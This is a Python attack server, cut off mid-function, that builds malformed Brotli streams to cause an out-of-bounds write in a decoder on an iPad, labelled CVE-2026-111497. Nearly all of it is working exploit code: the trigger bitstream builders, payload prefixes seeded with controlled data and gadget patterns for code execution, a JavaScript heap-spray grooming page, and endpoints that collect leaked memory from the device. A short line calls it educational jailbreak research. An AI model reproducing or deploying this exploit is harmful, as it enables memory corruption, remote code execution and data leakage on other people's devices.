#!/usr/bin/env python3
"""RCE-stream Brotli attack server for CVE-2026-111497.

Key insight: generate_rce_stream() embeds a prefix as an UNCOMPRESSED meta-block
BEFORE the trigger meta-block. The decoder writes prefix to ring buffer, then the
trigger's copy commands reference prefix data via controlled distance. When block
exhaustion triggers OOB, the write contains controlled (prefix) data.

This is ONE coherent Brotli stream — no chunking, no appending, no staging.

Educational jailbreak research only. For use on devices you own.
"""

import hashlib
import io
import json
import os
import socket
import ssl
import struct
import sys
import threading
import time
from collections import defaultdict

# --- Brotli trigger generation (exact dimas bitstream, confirmed working) ---

class BitWriter:
    def __init__(self):
        self.buffer = io.BytesIO()
        self.current_byte = 0
        self.bit_pos = 0

    def write_bits(self, value, num_bits):
        for i in range(num_bits):
            if value & (1 << i):
                self.current_byte |= (1 << self.bit_pos)
            self.bit_pos += 1
            if self.bit_pos == 8:
                self.buffer.write(bytes([self.current_byte]))
                self.current_byte = 0
                self.bit_pos = 0

    def flush(self):
        if self.bit_pos > 0:
            self.buffer.write(bytes([self.current_byte]))
            self.current_byte = 0
            self.bit_pos = 0

    def getvalue(self):
        self.flush()
        return self.buffer.getvalue()


def write_simple_prefix(w, code, value):
    if value == 1:
        w.write_bits(0, 1)
    else:
        w.write_bits(1, 1)
        w.write_bits(value - 2, code)


def write_single_symbol_tree(w, alphabet_bits, symbol):
    w.write_bits(1, 2)  # HTREE type = single symbol
    if symbol == 0:
        w.write_bits(0, 1)  # max_bits indicator
        w.write_bits(0, alphabet_bits)
    else:
        nsym_minus_1 = 0
        w.write_bits(nsym_minus_1, 1)
        w.write_bits(symbol, alphabet_bits)


def craft_trigger(command_count=40000):
    """Generate trigger stream - exact dimas bitstream with configurable command count.
    Uses NBLTYPESI=2 with symbol 25 (13 extra bits) for block length."""
    w = BitWriter()

    # Window size: WBITS=17 (1MB window)
    w.write_bits(0b0100001, 7)

    # Data meta-block header
    w.write_bits(0, 1)  # ISLAST=0
    w.write_bits(0b10, 2)  # MNIBBLES=2
    mlen_minus1 = 0xFFFFFF
    w.write_bits(mlen_minus1 & 0xFFF, 12)
    w.write_bits((mlen_minus1 >> 12) & 0xFFF, 12)

    # NBLTYPESL=1 (1 literal block type)
    write_simple_prefix(w, 1, 1)

    # NBLTYPESI=2 (2 insert/copy block types) - KEY for the exploit
    write_simple_prefix(w, 1, 2)

    # Command block type tree: 1-symbol (symbol 0)
    write_single_symbol_tree(w, 1, 0)

    # Command block length tree: 1-symbol (symbol 25)
    # Symbol 25 has 13 extra bits, base=24577, range up to 32768
    write_single_symbol_tree(w, 5, 25)

    # Block length extra bits for symbol 25: 13 bits
    # Value 0x1FFF = 8191, so block_length = 24577 + 8191 = 32768
    w.write_bits(0x1FFF, 13)

    # NBLTYPESD=1 (1 distance block type)
    write_simple_prefix(w, 1, 1)

    # NDIRECT=0, NPOSTFIX=0
    w.write_bits(0, 2)  # NPOSTFIX
    w.write_bits(0, 4)  # NDIRECT >> NPOSTFIX

    # Context modes for literal types: LSB6
    w.write_bits(0, 2)

    # NTREESL=1
    write_simple_prefix(w, 1, 1)

    # Literal Huffman tree: single symbol (ASCII 'H' = 0x48)
    write_single_symbol_tree(w, 8, 0x48)

    # Insert-and-copy length tree: single symbol
    # Symbol 2 = insert length 0, copy length 4
    write_single_symbol_tree(w, 10, 2)

    # Distance tree: single symbol (symbol 0 = last distance)
    write_single_symbol_tree(w, 6, 0)

    # Now emit commands to exhaust the block counter
    # Each command is: insert-and-copy (0 bits, single symbol) + distance (0 bits, single symbol)
    # = 11 bits per command (from the 1-symbol trees that absorb bits)
    # With block_length=32768, we need ~32768 commands to exhaust
    # Using command_count=40000 to ensure exhaustion with margin
    for _ in range(command_count):
        w.write_bits(0, 11)

    return w.getvalue()


class Bits:
    """Exact port of dimas Bits class — LSB-first writer for Brotli fields."""

    def __init__(self):
        self.data = bytearray()
        self.value = 0
        self.used = 0

    def put(self, value, count):
        for bit_index in range(count):
            self.value |= ((value >> bit_index) & 1) << self.used
            self.used += 1
            if self.used == 8:
                self.data.append(self.value)
                self.value = 0
                self.used = 0

    def aligned(self, value):
        if self.used:
            raise ValueError("writer is not byte-aligned")
        if isinstance(value, (bytes, bytearray)):
            self.data.extend(value)
        else:
            self.data.extend(value)

    def finish(self):
        if self.used:
            self.data.append(self.value)
            self.value = 0
            self.used = 0
        return bytes(self.data)


def _one_symbol_tree(bits, alphabet_size, symbol):
    """Exact port of dimas one_symbol_tree."""
    bits.put(1, 2)
    bits.put(0, 2)
    bits.put(symbol, (alphabet_size - 1).bit_length())


def _varlen_u8(bits, value):
    """Exact port of dimas varlen_u8."""
    if value == 0:
        bits.put(0, 1)
        return
    bits.put(1, 1)
    if value == 1:
        bits.put(0, 3)
        return
    width = value.bit_length() - 1
    bits.put(width, 3)
    bits.put(value - (1 << width), width)


def generate_rce_stream(prefix, command_block_extra, max_commands=None):
    """Exact port of dimas generate_rce_stream().

    Creates ONE Brotli stream:
      [Window header]
      [Meta-block 1: uncompressed prefix -> ring buffer]
      [Meta-block 2: trigger with block exhaustion -> OOB with prefix data]

    max_commands: if set, limits total commands (for smaller test streams).
    Default (None) uses 1<<24 = 16M commands (~23MB output).
    """
    bits = Bits()

    # Window header
    bits.put(1, 1)
    bits.put(0, 3)
    bits.put(2, 3)

    # Meta-block 1: uncompressed, holds prefix
    if prefix:
        bits.put(0, 1)                     # ISLAST = 0
        bits.put(0, 2)                     # MNIBBLES
        bits.put(len(prefix) - 1, 16)      # MLEN-1
        bits.put(1, 1)                     # ISUNCOMPRESSED = 1
        if bits.used:
            bits.put(0, 8 - bits.used)     # align to byte
        bits.aligned(prefix)

    # Meta-block 2: trigger
    bits.put(0, 1)                         # ISLAST = 0
    bits.put(2, 2)                         # MNIBBLES
    bits.put(0xFFFFFF, 24)                 # MLEN-1
    bits.put(0, 1)                         # ISUNCOMPRESSED = 0

    _varlen_u8(bits, 0)                    # NBLTYPESL = 1
    _varlen_u8(bits, 1)                    # NBLTYPESI = 2
    _one_symbol_tree(bits, 4, 0)           # I&C block type tree
    _one_symbol_tree(bits, 26, 25)         # I&C block length tree

    if not 0 <= command_block_extra <= 0xFFFFFF:
        raise ValueError("command_block_extra must fit in 24 bits")
    bits.put(command_block_extra, 24)      # ReadBlockLength extra bits

    _varlen_u8(bits, 0)                    # NBLTYPESD = 1
    bits.put(3, 6)                         # NPOSTFIX/NDIRECT
    bits.put(0, 2)                         # context mode

    _varlen_u8(bits, 0)                    # NTREESL
    _varlen_u8(bits, 0)                    # NTREESD

    _one_symbol_tree(bits, 256, 0)         # literal Huffman
    _one_symbol_tree(bits, 704, 130)       # I&C Huffman
    _one_symbol_tree(bits, 704, 130)       # I&C Huffman (2nd)
    _one_symbol_tree(bits, 400, 184)       # distance Huffman

    # Commands
    distance_extra = (len(prefix) + 32) // 8 if prefix else 4
    command_count = max_commands if max_commands else (1 << 24)
    completed = 0
    while bits.used and completed < command_count:
        bits.put(distance_extra, 11)
        completed += 1

    group = Bits()
    for _ in range(8):
        group.put(distance_extra, 11)
    group_bytes = group.finish()
    groups, tail = divmod(command_count - completed, 8)
    bits.aligned(group_bytes * groups)
    for _ in range(tail):
        bits.put(distance_extra, 11)

    return bits.finish()


def build_rce_stream(prefix_bytes, command_block_extra=0xFFFFFF):
    """Build complete RCE stream: prefix meta-block + trigger meta-block + padding.
    Matches dimas rce_stage_one() pattern."""
    return generate_rce_stream(prefix_bytes, command_block_extra) + b"\x00" * 3


def build_stage1(command_count=40000):
    """Stage 1: trigger stream + 3 null byte padding (matches dimas trigger_stages)."""
    trigger = craft_trigger(command_count)
    return trigger + b"\x00" * 3


def build_stage2_crash():
    """Stage 2 for crash/DoS: 0x7FFFFFFF at all positions (max OOB offset).
    Matches dimas trigger_stages() exactly."""
    second = bytearray(127)
    second[7] = 8
    struct.pack_into("<i", second, 15, 0x7FFFFFFF)
    struct.pack_into("<I", second, 19, 0x7FFFFFFF)
    struct.pack_into("<I", second, 23, 0x7FFFFFFF)
    return bytes(second)


def build_stage2_controlled(pos):
    """Stage 2 for controlled OOB write at specific position.
    Matches dimas rce_stage_two(pos, size=127)."""
    body = bytearray(127)
    body[7] = 8
    struct.pack_into("<i", body, 15, pos)
    struct.pack_into("<I", body, 19, 0x7FFFFFFF)
    struct.pack_into("<I", body, 23, 0x7FFFFFFF)
    return bytes(body)


def build_groom_stream(marker_byte, size=131072):
    """Build a valid Brotli stream that decompresses to `size` bytes of `marker_byte`.

    Uses brotli.compress() with lgwin=17 to force a 128KB ring buffer allocation.
    The decompressed output is all one byte — recognizable in memory.
    """
    try:
        import brotli
        data = bytes([marker_byte]) * size
        return brotli.compress(data, quality=0, lgwin=17)
    except ImportError:
        # Fallback: use the working generate_rce_stream approach
        # Build an uncompressed stream using the dimas Bits writer
        prefix = bytes([marker_byte]) * min(size, 65535)
        return generate_rce_stream(prefix, 0) + b"\x00" * 3


# Global groom session state
groom_sessions = {}
groom_lock = threading.Lock()
leaked_data = defaultdict(list)


# --- HTTP chunked encoding ---

def chunk(data):
    """Wrap data in HTTP chunked encoding format."""
    return f"{len(data):x}\r\n".encode("ascii") + data + b"\r\n"


def chunk_end():
    """Terminal chunk."""
    return b"0\r\n\r\n"


# --- SSL/TLS setup ---

def create_ssl_context(certfile, keyfile):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(certfile, keyfile)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    return ctx


def ensure_cert(cert_dir):
    """Generate self-signed cert if not present."""
    certfile = os.path.join(cert_dir, "server.crt")
    keyfile = os.path.join(cert_dir, "server.key")
    if os.path.exists(certfile) and os.path.exists(keyfile):
        return certfile, keyfile

    import subprocess
    subprocess.run([
        "openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
        "-keyout", keyfile, "-out", certfile,
        "-days", "365", "-subj", "/CN=192.168.1.155",
        "-addext", "subjectAltName=IP:192.168.1.155"
    ], check=True)
    return certfile, keyfile


# --- Server ---

LANDING = """<!DOCTYPE html>
<html>
<head><title>CVE-2026-111497 RCE Stream Attack</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: system-ui; max-width: 700px; margin: 2em auto; padding: 0 1em;
       background: #111; color: #eee; }
h1 { color: #f44; }
h2 { color: #fa0; margin-top: 2em; }
a { color: #4af; font-size: 1.2em; display: block; margin: 0.8em 0;
    padding: 12px 16px; background: #222; border-radius: 8px; text-decoration: none; }
a:hover { background: #333; }
.info { color: #888; font-size: 0.9em; }
.warn { color: #f80; background: #331800; padding: 12px; border-radius: 8px; margin: 1em 0; }
.new { color: #0f0; background: #002200; padding: 12px; border-radius: 8px; margin: 1em 0; }
.section { border-top: 1px solid #333; padding-top: 1em; }
code { background: #222; padding: 2px 6px; border-radius: 3px; }
</style>
</head>
<body>
<h1>CVE-2026-111497 RCE Stream Attack</h1>
<p class="new">NEW: RCE stream approach — prefix is embedded as an uncompressed
meta-block INSIDE the Brotli stream. ONE coherent stream, no staging needed.
The decoder writes prefix to ring buffer, then trigger copies from prefix region.
OOB write contains controlled data from prefix.</p>

<h2>RCE Streams (prefix embedded in Brotli stream)</h2>
<p class="info">generate_rce_stream(): uncompressed prefix meta-block + trigger meta-block.
The OOB write reads from prefix data in ring buffer.</p>

<a href="/rce/marker">RCE: 1KB prefix with 0xDEADBEEF marker pattern</a>
<a href="/rce/ascii">RCE: 1KB prefix with "AAAA..." pattern</a>
<a href="/rce/gadget">RCE: 1KB prefix with gadget pairs (dimas pattern)</a>
<a href="/rce/small-prefix">RCE: 64B prefix with marker</a>
<a href="/rce/no-prefix">RCE: no prefix (generate_rce_stream with empty prefix)</a>
<a href="/rce/mini">RCE MINI: 40K commands (~55KB) — fast test</a>
<a href="/rce/mini/100k">RCE MINI: 100K commands (~137KB)</a>
<a href="/rce/mini/1m">RCE MINI: 1M commands (~1.4MB)</a>

<div class="section">
<h2>RCE Streams — Command Block Extra Variants</h2>
<p class="info">Different command_block_extra values control block length after exhaustion.</p>
<a href="/rce/cbe/0">RCE: command_block_extra=0</a>
<a href="/rce/cbe/1000">RCE: command_block_extra=1000</a>
<a href="/rce/cbe/ffffff">RCE: command_block_extra=0xFFFFFF (max, same as trigger)</a>
</div>

<div class="section">
<h2>Heap Spray Grooming (Phase 2)</h2>
<p class="info">Opens parallel Brotli connections to spray 128KB ring buffers.
Then releases half to create holes and fires poison stream into adjacent slot.</p>
<a href="/groom/landing">GROOM: Interactive Heap Spray Page</a>
<a href="/groom/status">GROOM: Check active groom sessions (JSON)</a>
<a href="/probe/leaks">PROBE: View all leaked data (JSON)</a>
</div>

<div class="section">
<h2>Single-Shot Reference (confirmed working)</h2>
<p class="info">Original trigger with no prefix. Produces corrupted output on iPad.</p>
<a href="/br/small">SINGLE: Small trigger (55KB, confirmed corrupted output)</a>
</div>

<div class="section">
<h2>Legacy Combined (broken — appends after trigger)</h2>
<p class="info">These all fail with "cannot decode raw data" because appended bytes
form invalid meta-block headers. Kept for reference.</p>
<a href="/combined/crash">LEGACY: trigger + crash stage2</a>
</div>

<div class="section">
<h2>Raw Downloads</h2>
<a href="/raw/stage1">RAW: Stage 1 bytes</a>
<a href="/raw/stage2-crash">RAW: Stage 2 bytes (crash)</a>
<a href="/raw/rce-marker">RAW: RCE stream with marker prefix</a>
</div>

<p class="info" style="margin-top: 2em;">
Server: brotli_staged_server.py | Target: iPad Mini iOS 27.0.1<br>
RCE stream: prefix uncompressed meta-block + trigger meta-block (one stream)<br>
Reference: dimas generate_rce_stream() from CVE-2026-111497-POC
</p>
</body>
</html>"""


GROOM_LANDING = """<!DOCTYPE html>
<html>
<head><title>Heap Spray Grooming</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: system-ui; max-width: 700px; margin: 2em auto; padding: 0 1em;
       background: #111; color: #eee; }
h1 { color: #f44; }
#log { background: #1a1a1a; padding: 12px; border-radius: 8px; font-family: monospace;
       font-size: 0.85em; max-height: 60vh; overflow-y: auto; white-space: pre-wrap; }
.ok { color: #0f0; } .err { color: #f44; } .info { color: #4af; }
button { font-size: 1.1em; padding: 10px 24px; margin: 6px; border: none;
         border-radius: 6px; cursor: pointer; }
#btn-spray { background: #c33; color: #fff; }
#btn-poison { background: #f80; color: #000; }
#btn-read { background: #08f; color: #fff; }
</style>
</head>
<body>
<h1>Heap Spray Grooming Attack</h1>
<p>Phase 1: Spray 32 parallel Brotli connections (128KB ring buffers each).<br>
Phase 2: Release even-numbered connections (create holes).<br>
Phase 3: Fire poison RCE stream on connection 15 (OOB into adjacent slot).<br>
Phase 4: Read back responses from odd connections for info leak.</p>

<button id="btn-spray" onclick="startSpray()">Phase 1: Spray</button>
<button id="btn-poison" onclick="firePoison()" disabled>Phase 2+3: Release & Poison</button>
<button id="btn-read" onclick="readBack()" disabled>Phase 4: Read Back</button>

<div id="log"></div>

<script>
const GROOM_COUNT = 32;
const SERVER = location.origin;
let controllers = [];
let responses = [];
let groomId = Date.now().toString(36);

function log(msg, cls) {
    const el = document.getElementById('log');
    const span = document.createElement('span');
    span.className = cls || '';
    span.textContent = msg + '\\n';
    el.appendChild(span);
    el.scrollTop = el.scrollHeight;
}

async function startSpray() {
    document.getElementById('btn-spray').disabled = true;
    log('[*] Starting heap spray: ' + GROOM_COUNT + ' parallel Brotli connections...', 'info');
    log('[*] Session ID: ' + groomId, 'info');

    controllers = [];
    responses = [];

    // Open all connections simultaneously
    let fetches = [];
    for (let i = 0; i < GROOM_COUNT; i++) {
        let ctrl = new AbortController();
        controllers.push(ctrl);
        let marker = (0x40 + i) & 0xFF; // '@', 'A', 'B', ... unique per slot
        fetches.push(
            fetch(SERVER + '/groom/' + groomId + '/' + i + '?marker=' + marker, {
                signal: ctrl.signal,
                headers: {'Accept': 'text/html'}
            }).then(resp => {
                responses[i] = resp;
                log('[+] Groom ' + i + ' connected (marker=0x' + marker.toString(16) + ')', 'ok');
            }).catch(err => {
                log('[-] Groom ' + i + ' failed: ' + err.message, 'err');
                responses[i] = null;
            })
        );
    }

    await Promise.allSettled(fetches);
    let connected = responses.filter(r => r !== null).length;
    log('[*] Spray complete: ' + connected + '/' + GROOM_COUNT + ' connections active', 'info');
    log('[*] ' + connected + ' x 128KB ring buffers = ' + (connected * 128) + 'KB in WebKit.Networking heap', 'info');
    document.getElementById('btn-poison').disabled = false;
}

async function firePoison() {
    document.getElementById('btn-poison').disabled = true;
    log('\\n[*] Phase 2: Releasing even-numbered connections...', 'info');

    // Abort even connections to create holes
    for (let i = 0; i < GROOM_COUNT; i += 2) {
        if (controllers[i]) {
            controllers[i].abort();
            log('[~] Released groom ' + i, '');
        }
    }

    // Small delay for allocator to process frees
    await new Promise(r => setTimeout(r, 200));

    log('[*] Phase 3: Firing poison RCE stream on /poison/leak ...', 'info');
    log('[*] This triggers deterministic OOB (cbe=0x003F0F, block_length=32768)', 'info');

    // Fire the poison stream — the OOB write targets adjacent memory
    try {
        let poisonResp = await fetch(SERVER + '/poison/leak');
        let poisonText = await poisonResp.text();
        log('[+] Poison response received: ' + poisonText.length + ' chars', 'ok');
        if (poisonText.length > 0) {
            // Show first 200 chars as hex-ish representation
            let preview = '';
            for (let j = 0; j < Math.min(100, poisonText.length); j++) {
                let c = poisonText.charCodeAt(j);
                preview += (c < 32 || c > 126) ? '\\\\x' + c.toString(16).padStart(2,'0') : poisonText[j];
            }
            log('[*] Poison output preview: ' + preview, 'info');
        }
    } catch(err) {
        log('[-] Poison failed: ' + err.message, 'err');
    }

    document.getElementById('btn-read').disabled = false;
}

async function readBack() {
    document.getElementById('btn-read').disabled = true;
    log('\\n[*] Phase 4: Reading back odd-numbered groom responses...', 'info');

    for (let i = 1; i < GROOM_COUNT; i += 2) {
        if (responses[i]) {
            try {
                let text = await responses[i].text();
                log('[+] Groom ' + i + ': ' + text.length + ' bytes', 'ok');
                // Look for corruption — bytes that don't match the expected marker
                let marker = (0x40 + i) & 0xFF;
                let expectedChar = String.fromCharCode(marker);
                let corrupted = 0;
                for (let j = 0; j < text.length; j++) {
                    if (text.charCodeAt(j) !== marker) corrupted++;
                }
                if (corrupted > 0) {
                    log('[!!!] Groom ' + i + ': ' + corrupted + ' corrupted bytes (expected 0x' +
                        marker.toString(16) + ')', 'err');
                    // Extract corrupted region
                    let corruptStart = -1;
                    for (let j = 0; j < text.length; j++) {
                        if (text.charCodeAt(j) !== marker) { corruptStart = j; break; }
                    }
                    if (corruptStart >= 0) {
                        let region = '';
                        for (let j = corruptStart; j < Math.min(corruptStart + 64, text.length); j++) {
                            let c = text.charCodeAt(j);
                            region += c.toString(16).padStart(2, '0') + ' ';
                        }
                        log('[*] Corrupted region at offset ' + corruptStart + ': ' + region, 'info');
                        // Send to server for analysis
                        fetch(SERVER + '/probe/readback', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                session: groomId,
                                slot: i,
                                offset: corruptStart,
                                hex: region.trim(),
                                total_len: text.length,
                                corrupted_count: corrupted
                            })
                        });
                    }
                } else {
                    log('[=] Groom ' + i + ': clean (no corruption detected)', '');
                }
            } catch(err) {
                log('[-] Groom ' + i + ' read failed: ' + err.message, 'err');
            }
        }
    }
    log('\\n[*] Readback complete. Check server console for leaked data.', 'info');
}
</script>
</body>
</html>"""


def _send_br_response(ssl_sock, payload):
    """Send a Content-Encoding: br response."""
    headers = (
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: text/html; charset=utf-8\r\n"
        b"Content-Encoding: br\r\n"
        + f"Content-Length: {len(payload)}\r\n".encode()
        + b"Connection: close\r\n"
        b"Cache-Control: no-store\r\n\r\n"
    )
    ssl_sock.sendall(headers + payload)


def _send_html(ssl_sock, body_str):
    """Send a plain HTML response."""
    body = body_str.encode("utf-8") if isinstance(body_str, str) else body_str
    resp = (
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: text/html; charset=utf-8\r\n"
        + f"Content-Length: {len(body)}\r\n".encode()
        + b"Connection: close\r\n\r\n"
        + body
    )
    ssl_sock.sendall(resp)


def _send_br_chunked_slow(ssl_sock, payload, chunk_size=4096, delay=0.5):
    """Send Brotli response using chunked transfer encoding with delays.
    Keeps the connection (and ring buffer) alive."""
    headers = (
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: text/html; charset=utf-8\r\n"
        b"Content-Encoding: br\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Connection: keep-alive\r\n"
        b"Cache-Control: no-store\r\n\r\n"
    )
    ssl_sock.sendall(headers)
    offset = 0
    while offset < len(payload):
        end = min(offset + chunk_size, len(payload))
        ssl_sock.sendall(chunk(payload[offset:end]))
        offset = end
        if offset < len(payload):
            time.sleep(delay)
    ssl_sock.sendall(chunk_end())


def _send_json(ssl_sock, obj):
    body = json.dumps(obj).encode("utf-8")
    ssl_sock.sendall(
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: application/json\r\n"
        b"Access-Control-Allow-Origin: *\r\n"
        + f"Content-Length: {len(body)}\r\n".encode()
        + b"Connection: close\r\n\r\n"
        + body
    )


def _read_post_body(ssl_sock, request):
    """Extract POST body from HTTP request."""
    parts = request.split(b"\r\n\r\n", 1)
    if len(parts) > 1:
        return parts[1]
    return b""


def _send_raw(ssl_sock, data, filename):
    """Send raw binary download."""
    ssl_sock.sendall(
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: application/octet-stream\r\n"
        + f"Content-Disposition: attachment; filename={filename}\r\n".encode()
        + f"Content-Length: {len(data)}\r\n".encode()
        + b"Connection: close\r\n\r\n"
        + data
    )


def handle_client(ssl_sock, addr, stage1, stage2_crash):
    """Handle a single client connection."""
    try:
        ssl_sock.settimeout(120)
        request = ssl_sock.recv(8192)
        if not request:
            return

        req_line = request.split(b"\r\n")[0].decode("utf-8", errors="replace")
        method, path, *_ = req_line.split(" ", 2)
        print(f"[{addr[0]}:{addr[1]}] {method} {path}")

        if method == "OPTIONS":
            ssl_sock.sendall(
                b"HTTP/1.1 204 No Content\r\n"
                b"Access-Control-Allow-Origin: *\r\n"
                b"Access-Control-Allow-Methods: GET, POST, OPTIONS\r\n"
                b"Access-Control-Allow-Headers: Content-Type\r\n"
                b"Connection: close\r\n\r\n"
            )
            return

        if path == "/":
            _send_html(ssl_sock, LANDING)

        # --- RCE Stream endpoints (NEW) ---
        elif path.startswith("/rce/"):
            parts = path.split("/")
            cbe = 0xFFFFFF  # default command_block_extra

            if len(parts) >= 3 and parts[2] == "marker":
                prefix = bytearray(1024)
                for i in range(0, 1024, 4):
                    struct.pack_into("<I", prefix, i, 0xDEADBEEF)
                payload = build_rce_stream(bytes(prefix), cbe)
                print(f"  -> RCE STREAM: 1KB DEADBEEF prefix, cbe=0x{cbe:X}, total={len(payload)}B")

            elif len(parts) >= 3 and parts[2] == "ascii":
                prefix = b"A" * 1024
                payload = build_rce_stream(prefix, cbe)
                print(f"  -> RCE STREAM: 1KB ASCII prefix, cbe=0x{cbe:X}, total={len(payload)}B")

            elif len(parts) >= 3 and parts[2] == "gadget":
                prefix = bytearray(1024)
                target = 0x4141414142424242
                pair = struct.pack("<QQ", target, target)
                for offset in range(71, len(prefix) - 15, 16):
                    prefix[offset:offset + 16] = pair
                payload = build_rce_stream(bytes(prefix), cbe)
                print(f"  -> RCE STREAM: 1KB gadget prefix, cbe=0x{cbe:X}, total={len(payload)}B")

            elif len(parts) >= 3 and parts[2] == "small-prefix":
                prefix = bytearray(64)
                for i in range(0, 64, 4):
                    struct.pack_into("<I", prefix, i, 0xCAFEBABE)
                payload = build_rce_stream(bytes(prefix), cbe)
                print(f"  -> RCE STREAM: 64B CAFEBABE prefix, cbe=0x{cbe:X}, total={len(payload)}B")

            elif len(parts) >= 3 and parts[2] == "no-prefix":
                payload = generate_rce_stream(b"", cbe) + b"\x00" * 3
                print(f"  -> RCE STREAM: no prefix, cbe=0x{cbe:X}, total={len(payload)}B")

            elif len(parts) >= 3 and parts[2] == "mini":
                counts = {"100k": 100_000, "1m": 1_000_000, "10m": 10_000_000}
                mc = 40_000
                if len(parts) >= 4:
                    mc = counts.get(parts[3], 40_000)
                prefix = bytearray(1024)
                for i in range(0, 1024, 4):
                    struct.pack_into("<I", prefix, i, 0xDEADBEEF)
                payload = generate_rce_stream(bytes(prefix), cbe, max_commands=mc) + b"\x00" * 3
                print(f"  -> RCE MINI: {mc} commands, 1KB DEADBEEF prefix, total={len(payload)}B")

            elif len(parts) >= 4 and parts[2] == "cbe":
                try:
                    cbe = int(parts[3], 16) if len(parts[3]) > 2 else int(parts[3])
                except ValueError:
                    cbe = 0xFFFFFF
                prefix = bytearray(1024)
                for i in range(0, 1024, 4):
                    struct.pack_into("<I", prefix, i, 0xDEADBEEF)
                payload = build_rce_stream(bytes(prefix), cbe)
                print(f"  -> RCE STREAM: 1KB DEADBEEF prefix, cbe=0x{cbe:X}, total={len(payload)}B")

            else:
                body = b"404 Unknown RCE variant\n"
                ssl_sock.sendall(
                    b"HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\n"
                    + f"Content-Length: {len(body)}\r\n".encode()
                    + b"Connection: close\r\n\r\n" + body
                )
                return

            _send_br_response(ssl_sock, payload)

        # --- Optimized poison endpoints (small CBE for deterministic OOB) ---
        elif path.startswith("/poison/"):
            parts = path.split("/")
            variant = parts[2] if len(parts) > 2 else ""

            if variant == "leak":
                # Small CBE for deterministic block exhaustion
                # cbe=0x003F0F → block_length=32768, OOB starts at rb_pos=0
                # After 32768 commands (128KB), writes start hitting adjacent memory
                prefix = bytearray(1024)
                for i in range(0, 1024, 4):
                    struct.pack_into("<I", prefix, i, 0xDEADBEEF)
                payload = build_rce_stream(bytes(prefix), 0x003F0F)
                print(f"  -> POISON/LEAK: 1KB DEADBEEF, cbe=0x003F0F, total={len(payload)}B")
                _send_br_response(ssl_sock, payload)

            elif variant == "info":
                # Minimal OOB — just enough to corrupt adjacent ring buffer
                # cbe=0x000000 → block_length=16625, only 66500 bytes before OOB
                prefix = bytearray(1024)
                for i in range(0, 1024, 8):
                    struct.pack_into("<Q", prefix, i, 0x4141414141414141)
                payload = build_rce_stream(bytes(prefix), 0x000000)
                print(f"  -> POISON/INFO: 1KB pattern, cbe=0x0, total={len(payload)}B")
                _send_br_response(ssl_sock, payload)

            elif variant == "spray":
                # Medium CBE for more wraps through ring buffer before OOB
                # cbe=0x010000 → ~328KB written, 2 wraps
                prefix = bytearray(1024)
                for i in range(0, 1024, 4):
                    struct.pack_into("<I", prefix, i, 0xCAFEBABE)
                payload = build_rce_stream(bytes(prefix), 0x010000)
                print(f"  -> POISON/SPRAY: 1KB CAFEBABE, cbe=0x10000, total={len(payload)}B")
                _send_br_response(ssl_sock, payload)

            else:
                body = b"404 Unknown poison variant. Try: leak, info, spray\n"
                ssl_sock.sendall(
                    b"HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\n"
                    + f"Content-Length: {len(body)}\r\n".encode()
                    + b"Connection: close\r\n\r\n" + body
                )
                return

        # --- Heap spray grooming endpoints ---
        elif path == "/groom/landing":
            _send_html(ssl_sock, GROOM_LANDING)

        elif path.startswith("/groom/") and "/" in path[7:]:
            # /groom/<session_id>/<slot>?marker=<byte>
            parts = path.split("/")
            if len(parts) >= 4:
                session_id = parts[2]
                try:
                    slot = int(parts[3].split("?")[0])
                except ValueError:
                    slot = 0
                # Parse marker from query string
                marker = 0x41
                if "marker=" in path:
                    try:
                        marker = int(path.split("marker=")[1].split("&")[0])
                    except ValueError:
                        marker = 0x41

                print(f"  -> GROOM: session={session_id} slot={slot} marker=0x{marker:02X}")

                # Build a valid Brotli stream that decompresses to 128KB of marker bytes
                groom_payload = build_groom_stream(marker, 131072)
                print(f"  -> GROOM stream: {len(groom_payload)}B -> 128KB decompressed")

                # Track this groom connection
                with groom_lock:
                    if session_id not in groom_sessions:
                        groom_sessions[session_id] = {}
                    groom_sessions[session_id][slot] = {
                        "marker": marker,
                        "time": time.time(),
                        "payload_size": len(groom_payload),
                    }

                # Send using slow chunked delivery to keep connection alive
                ssl_sock.settimeout(120)
                _send_br_chunked_slow(ssl_sock, groom_payload, chunk_size=8192, delay=0.1)
            else:
                _send_html(ssl_sock, "400 Bad groom path")

        elif path == "/groom/status":
            with groom_lock:
                _send_json(ssl_sock, {
                    "sessions": {
                        sid: {str(k): v for k, v in slots.items()}
                        for sid, slots in groom_sessions.items()
                    }
                })

        elif path == "/probe/readback" and method == "POST":
            body = _read_post_body(ssl_sock, request)
            try:
                data = json.loads(body)
                print(f"\n{'='*60}")
                print(f"[LEAK] Session={data.get('session')} Slot={data.get('slot')}")
                print(f"[LEAK] Offset={data.get('offset')} Corrupted={data.get('corrupted_count')}")
                print(f"[LEAK] Hex: {data.get('hex', '')[:200]}")
                print(f"{'='*60}\n")
                with groom_lock:
                    leaked_data[data.get("session", "unknown")].append(data)
                _send_json(ssl_sock, {"status": "received"})
            except (json.JSONDecodeError, KeyError) as e:
                _send_json(ssl_sock, {"status": "error", "msg": str(e)})

        elif path == "/probe/leaks":
            with groom_lock:
                _send_json(ssl_sock, dict(leaked_data))

        # --- Legacy combined (broken, kept for reference) ---
        elif path.startswith("/combined/"):
            parts = path.split("/")
            stage2 = stage2_crash
            trigger = craft_trigger(40000)
            pad_len = 3

            if len(parts) >= 3 and parts[2] == "crash":
                pad_len = 3
            elif len(parts) >= 3 and parts[2] == "nopad-crash":
                pad_len = 0
            elif len(parts) >= 3 and parts[2] == "pad":
                try:
                    pad_len = int(parts[3])
                except (ValueError, IndexError):
                    pad_len = 3
            elif len(parts) >= 4 and parts[2] == "controlled":
                pad_len = 0
                try:
                    pos = int(parts[3])
                    stage2 = build_stage2_controlled(pos)
                except (ValueError, IndexError):
